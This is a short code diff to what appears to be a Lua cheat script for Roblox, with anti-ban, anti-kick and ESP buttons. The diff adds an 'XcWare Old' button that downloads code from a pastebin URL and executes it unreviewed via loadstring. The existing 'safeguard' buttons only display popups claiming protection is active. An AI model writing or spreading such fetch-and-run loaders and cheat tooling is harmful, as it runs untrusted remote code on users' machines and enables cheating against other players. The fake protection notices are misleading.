@@ -1164,6 +1164,12 @@ CreateUtilBtn("ANTI-BAN", function() _G.ShowPopupRef("SAFEGUARD: ANTI-BAN ACTIVE
 CreateUtilBtn("ANTI-KICK", function() _G.ShowPopupRef("SAFEGUARD: ANTI-KICK ACTIVE") end)
 CreateUtilBtn("ANTI-LOGGER", function() _G.ShowPopupRef("SAFEGUARD: ANTI-LOGGER ACTIVE") end)
 
+-- [[ NEWLY ADDED BUTTON ]]
+CreateUtilBtn("XcWare Old", function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/FnD820ZN"))()
+    _G.ShowPopupRef("EXECUTING XCWARE OLD")
+end)
+
 local espBtn = CreateUtilBtn("ESP: OFF", function()
     espEnabled = not espEnabled
     if espEnabled then
